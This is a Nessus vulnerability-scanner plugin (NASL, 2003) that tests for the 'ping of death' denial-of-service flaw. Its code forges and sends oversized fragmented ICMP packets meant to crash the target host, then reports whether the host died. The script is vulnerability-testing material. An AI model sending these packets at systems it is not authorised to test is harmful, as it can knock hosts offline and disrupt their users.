#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#

if(description)
{
 script_id(11903);
 script_version ("$Revision: 1.4 $");
 
 name["english"] = "ping of death";
 script_name(english:name["english"]);
 
 desc["english"] = "
The machine crashed when pinged with an incorrectly fragmented packet.
This is known as the 'jolt' or 'ping of death' denial of service attack.

An attacker may use this flaw to shut down this server,
thus preventing you from working properly.

Solution : contact your operating system vendor for a patch.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crash target with a too long fragmented packets";
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 exit(0);
}

#

id = rand() % 65536;

if (! mtu) mtu = 1500; 
maxdata = mtu - 20 - 8;	# IP + ICMP
maxdata = maxdata / 8; maxdata = maxdata * 8;
if (maxdata < 16) maxdata = 544;

dl = 65535 / (mtu - 20); 
dl ++;
dl *= maxdata;

src = this_host();

id = rand() % 65535 + 1;
seq = rand() % 256;

start_denial();
for (j = 0; j < dl; j=j+maxdata)
{
  datalen = dl - j;
  o = j / 8;
  if (datalen > maxdata) {
   o = o | 0x2000;
   datalen = maxdata;
  }

  ##display(string("j=", j, "; o=", o, ";dl=", datalen, "\n"));
  ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:o,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
	     	        ip_src: src);
  icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		  icmp_seq: seq, icmp_id:seq, data:crap(datalen-8));
  send_packet(icmp, pcap_active: 0);
}

alive = end_denial();
if(!alive)
{
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}

